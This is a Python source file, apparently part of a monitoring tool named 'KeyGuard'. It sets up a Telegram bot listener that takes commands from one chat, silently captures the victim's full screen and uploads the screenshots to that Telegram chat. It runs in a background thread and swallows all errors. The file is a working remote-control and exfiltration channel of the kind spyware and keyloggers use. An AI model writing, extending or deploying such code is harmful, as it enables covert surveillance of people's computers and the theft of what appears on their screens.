import threading
import requests
import time
import subprocess
import os


class CommandListener:
    def __init__(self, token, chat_id, reporter, stop_event):
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.chat_id = chat_id
        self.reporter = reporter
        self.stop_event = stop_event
        self.last_update_id = 0
        self.running = False
        self.thread = None

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._poll_loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False

    def _take_screenshot(self):
        path = "/tmp/keyguard_screenshot.png"
        try:
            subprocess.run(["import", "-window", "root", path], capture_output=True, timeout=10)
            if os.path.exists(path):
                return path
        except:
            pass
        return None

    def _poll_loop(self):
        while self.running:
            try:
                resp = requests.get(
                    f"{self.base_url}/getUpdates",
                    params={"offset": self.last_update_id + 1, "timeout": 10},
                    timeout=15,
                ).json()
                if resp.get("ok"):
                    for update in resp["result"]:
                        self.last_update_id = update["update_id"]
                        msg = update.get("message", {})
                        text = msg.get("text", "")
                        chat_id = msg.get("chat", {}).get("id")
                        if chat_id and str(chat_id) == self.chat_id:
                            self._handle(text.strip())
            except:
                pass

    def _handle(self, text):
        cmd = text.lower().split()[0] if text else ""

        if cmd == "/status":
            self.reporter.send_message(self.reporter.get_status())

        elif cmd == "/screenshot":
            self.reporter.send_message("[KeyGuard] Capturing screenshot...")
            path = self._take_screenshot()
            if path:
                self.reporter.send_photo(path)
                os.remove(path)
            else:
                self.reporter.send_message("[KeyGuard] Screenshot failed")

        elif cmd == "/help":
            self.reporter.send_message(
                "KeyGuard Commands:\n"
                "/status - Show status & stats\n"
                "/screenshot - Capture screen\n"
                "/stop - Stop KeyGuard\n"
                "/help - Show this menu"
            )

        elif cmd == "/stop":
            self.reporter.send_message("[KeyGuard] Stopping...")
            self.reporter.stop()
            self.stop_event.set()
